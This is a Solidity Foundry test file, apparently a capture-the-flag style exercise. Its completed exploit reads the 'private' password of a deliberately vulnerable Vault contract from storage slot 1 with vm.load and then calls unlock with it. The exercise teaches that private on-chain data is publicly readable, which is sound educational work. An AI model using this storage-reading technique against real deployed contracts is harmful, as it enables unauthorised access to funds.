// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    Vault public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    // Password used at deploy time — pretend you do NOT know this as the attacker.
    // On-chain you would read it from storage instead of hardcoding it here.
    bytes32 private constant DEPLOY_PASSWORD = keccak256("super secret password");

    function setUp() public {
        vm.startPrank(deployer);
        target = new Vault(DEPLOY_PASSWORD);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition:
        //   vault is unlocked  →  locked == false
        //
        // Hints (look at Vault.sol carefully):
        //   - `private` only hides the Solidity getter — data is still on-chain
        //   - Storage layout:
        //       slot 0 → locked (bool)
        //       slot 1 → password (bytes32)
        //   - Foundry: read a slot with
        //       bytes32 data = vm.load(address(target), bytes32(uint256(1)));
        //   - Then call unlock with that value
        //
        // Do NOT use DEPLOY_PASSWORD in the exploit — practice reading storage.

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        bytes32 data = vm.load(address(target), bytes32(uint256(1)));
        target.unlock(data);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.locked(), false, "vault should be unlocked");
    }
}
